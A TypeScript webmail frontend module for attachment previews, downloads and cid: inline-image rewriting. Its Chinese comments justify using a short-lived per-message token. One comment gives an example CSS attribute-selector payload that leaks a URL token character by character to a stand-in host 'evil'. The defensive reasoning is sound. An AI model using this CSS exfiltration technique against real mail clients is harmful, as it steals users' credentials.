import api from '@/lib/api'
import type { Attachment } from '@/lib/types'

/** 可预览的 MIME 类型前缀（图片 / PDF）。 */
const PREVIEWABLE = /^(image\/|application\/pdf)/

/** 判断附件是否可在浏览器中直接预览。 */
export function isPreviewable(a: Attachment): boolean {
  return PREVIEWABLE.test(a.content_type || '')
}

/**
 * 返回带凭据的附件访问 URL（用于 img/iframe/新标签预览）。
 * 凭据走 query 参数而非请求头，因为 img src / a href 无法附带自定义请求头。
 *
 * ⚠⚠ token 只能是详情接口给的 attachment_token（后端也只认这一种：`?ticket=` 参数上
 * 出现 access token 会被直接 401）。这里**不设任何退回 access token 的兜底**。
 *
 * 原因：这个 URL 会被写进邮件正文文档（cid: 内联图改写），而那份文档的内容由发件人
 * 完全控制。开启远程内容后 style-src 允许内联样式，邮件自带的 <style> 块可以写
 * `img[src^="…ticket=eyJhb"]{background:url(https://evil/1)}` 这样的属性选择器，
 * 用「命中就发一个远程请求」的方式把凭据逐字符问出来，全程不需要执行任何脚本，
 * CSP 的 script-src 与沙箱都拦不住。
 * access token 一旦外泄就是整个账号；attachment_token 只能取这一封邮件的附件、一小时过期。
 *
 * ⚠ 这里用的是**可重复使用**的 attachment_token，而不是 SSE 那种一次性票据：
 * 一封信里的十几张 cid: 内联图会由浏览器并发请求，用完即废的票只有第一张图能加载。
 * 「限定单封 + 短时效」才是这条路径上正确的收敛方向。
 *
 * @param token 详情接口返回的 attachment_token；缺失时返回不带凭据的 URL（后端 401），
 *   宁可这一张图裂掉，也不能把长期凭据写进邮件文档。
 */
export function attachmentUrl(
  messageId: number,
  idx: number,
  token: string | undefined,
  opts?: { download?: boolean },
): string {
  const dl = opts?.download ? '&dl=1' : ''
  return `/api/v1/messages/${messageId}/attachments/${idx}?ticket=${encodeURIComponent(token ?? '')}${dl}`
}

/**
 * 通过 axios（Bearer 头）以 blob 方式下载附件并触发浏览器另存为。
 * 不将 token 暴露到 URL 中。
 */
export async function downloadAttachment(
  messageId: number,
  idx: number,
  filename: string,
): Promise<void> {
  const res = await api.get(`/messages/${messageId}/attachments/${idx}?dl=1`, {
    responseType: 'blob',
  })
  const url = URL.createObjectURL(res.data as Blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename || 'attachment'
  document.body.appendChild(a)
  a.click()
  a.remove()
  // 延迟释放：a.click() 触发的下载是异步发起的，立即 revoke 在部分浏览器
  // （Firefox / 大文件）会导致下载到空文件，故留出时间再释放。
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}

/**
 * 将正文 HTML 中的 `cid:` 引用改写为附件接口 URL，
 * 使内联图片（如签名图、嵌入图）能在 iframe 中正常渲染。
 *
 * content_id 比对忽略大小写，同时兼容带尖括号 `<cid>` 的形式（仅匹配括号内的值）。
 * 前导字符兼容引号、括号与无引号属性（`src=cid:xxx`）。
 *
 * ⚠ token 必须传详情接口给的 attachment_token：改写结果直接落进邮件正文文档，
 * 而那份文档的内容由发件人控制，可以用 CSS 属性选择器把 URL 里的令牌逐字符外泄。
 * 完整说明见 attachmentUrl。
 */
export function rewriteCidLinks(
  html: string,
  messageId: number,
  attachments: Attachment[],
  token: string | undefined,
): string {
  return html.replace(/(["'(=])cid:([^"')\s>]+)/gi, (m, pre, cid) => {
    // 去掉可能的 < > 包裹
    const cidClean = String(cid).replace(/^<|>$/g, '').toLowerCase()
    const idx = attachments.findIndex((a) => {
      if (!a.content_id) return false
      return a.content_id.replace(/^<|>$/g, '').toLowerCase() === cidClean
    })
    if (idx < 0) return m
    return pre + attachmentUrl(messageId, idx, token)
  })
}
